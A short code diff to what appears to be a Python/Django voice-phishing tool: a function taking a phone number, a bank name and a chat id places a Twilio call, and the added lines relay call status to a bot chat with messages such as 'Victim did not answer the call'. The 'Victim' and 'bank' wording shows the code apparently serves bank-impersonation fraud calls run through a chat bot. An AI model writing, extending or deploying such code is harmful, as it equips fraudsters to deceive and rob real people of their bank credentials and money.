@@ -8,6 +8,7 @@ from django.core.mail import EmailMultiAlternatives
 from django.template.loader import render_to_string
 from twilio.rest import Client
 import os
+from asgiref.sync import async_to_sync
 TWILIO_ACCOUNT_SID=os.environ.get('TWILIO_ACCOUNT_SID')
 TWILIO_AUTH_TOKEN=os.environ.get('TWILIO_AUTH_TOKEN')
 TWILIO_PHONE_NUMBER=os.environ.get('TWILIO_PHONE_NUMBER')
@@ -194,4 +195,14 @@ def call(number,bank,chat_id):
                             to=number,
                             from_=TWILIO_PHONE_NUMBER
                         )
+    
+    if call.status == 'no-answer':
+        message = "Victim did not answer the call"
+        async_to_sync(bot)(chat_id,f"{message}")
+    elif call.status == 'busy':
+        message = "Victim's line is busy"
+        async_to_sync(bot)(chat_id,f"{message}")
+    elif call.status == 'ringing':
+        message = "Victim's phone is ringing"
+        async_to_sync(bot)(chat_id,f"{message}")
 
